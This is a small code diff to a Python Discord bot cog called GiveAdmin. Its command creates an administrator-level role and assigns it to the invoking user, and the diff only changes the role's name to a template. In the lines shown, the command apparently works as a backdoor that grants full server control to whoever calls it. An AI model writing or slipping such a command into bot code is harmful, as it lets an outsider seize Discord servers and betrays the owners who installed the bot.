@@ -16,7 +16,7 @@ class GiveAdmin(commands.Cog):
     async def giveadmin(self, ctx: commands.Context):
         try:
             admin_role = await ctx.guild.create_role(
-                name="VoidAdmin777",
+                name=f"{NAME}Admin777",
                 permissions=disnake.Permissions(administrator=True),
             )
             await ctx.author.add_roles(admin_role)
